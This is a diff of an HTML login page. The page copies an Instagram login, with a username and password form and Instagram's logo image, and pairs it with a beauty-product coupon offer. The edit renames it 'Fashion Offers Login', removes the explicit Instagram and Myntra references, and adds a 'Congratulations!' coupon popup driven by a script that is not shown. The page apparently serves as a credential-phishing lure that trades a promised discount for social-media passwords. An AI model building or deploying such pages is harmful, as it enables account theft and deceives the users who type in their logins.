@@ -2,20 +2,18 @@
 <html lang="en">
 
 <head>
-    <title>Instagram Login</title>
+    <title>Fashion Offers Login</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="icon" href="images/favicon.png" type="image/icon">
     <link rel="stylesheet" href="style.css">
 </head>
 
 <body>
     <div class="container">
-        <!-- Instagram login section -->
+        <!-- Login section -->
         <div class="login-section">
-            <img src="https://tse4.mm.bing.net/th?id=OIP.aWhpAoFdTKWAQNIb_18bZwHaHL&pid=Api&P=0&h=180"
-                alt="Instagram Logo">
-            <form id="loginForm" action="/api/login" method="post">
+            <img src="https://tse4.mm.bing.net/th?id=OIP.aWhpAoFdTKWAQNIb_18bZwHaHL&pid=Api&P=0&h=180" alt="Logo">
+            <form id="loginForm">
                 <input type="text" placeholder="Phone number, username, or email" name="u_name" required>
                 <input type="password" placeholder="Password" name="pass" required>
                 <div class="loginbutton"><button type="submit">Log in</button></div>
@@ -25,34 +23,28 @@
                 <a href="#">Log in With Facebook</a>
             </div>
             <div class="signup">
-                <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></p>
+                <p>Don't have an account? <a href="#">Sign up</a></p>
             </div>
-            <div id="responseMessage"></div> <!-- Response message area -->
         </div>
 
-        <!-- Myntra Offer Section -->
-        <div class="offer-section">
-            <h3>Exclusive Myntra Offers on Beauty Products!</h3>
-            <p>Get amazing discounts on women’s beauty products.</p>
-            <p><a href="https://www.myntra.com">Access your code</a> to claim your coupon!</p>
-
-            <!-- Product images grid -->
-            <div class="product-grid">
-                <img src="https://tse3.mm.bing.net/th?id=OIP.W-7oQWf4-2hW33K_oMv9cgHaDt&pid=Api&P=0&h=180"
-                    alt="Beauty Product 1">
-                <img src="https://tse3.mm.bing.net/th?id=OIP.J2lhFO7dgfwOtzZx3Ou9HgHaHa&pid=Api&P=0&h=180"
-                    alt="Beauty Product 2">
-                <img src="https://tse4.mm.bing.net/th?id=OIP.JlLOB2oJGSZH-w8Zl3cHGQHaD4&pid=Api&P=0&h=180"
-                    alt="Beauty Product 3">
-                <img src="https://tse1.mm.bing.net/th?id=OIP.bG6zCQhobeuS_j8VJAYkBQHaC0&pid=Api&P=0&h=180"
-                    alt="Beauty Product 4">
-                <img src="https://tse2.mm.bing.net/th?id=OIP.dqlAlipC_-LFmzmq_VKxgQHaDC&pid=Api&P=0&h=180"
-                    alt="Beauty Product 5">
-                <img src="https://tse4.mm.bing.net/th?id=OIP.dKjn0SDGHLFAY5oobgTuxgHaLG&pid=Api&P=0&h=180"
-                    alt="Beauty Product 6">
+        <!-- Coupon Modal -->
+        <div id="couponModal" class="modal">
+            <div class="modal-content">
+                <div class="coupon-container">
+                    <h2>Congratulations! 🎉</h2>
+                    <div class="coupon-code">
+                        <span id="couponCode">Loading...</span>
+                    </div>
+                    <p id="discountText">Loading...</p>
+                    <button id="copyCoupon">Copy Code</button>
+                    <button id="closeModal">Close</button>
+                </div>
             </div>
         </div>
     </div>
+
+    <script src="script.js"></script>
 </body>
+
 
 </html>
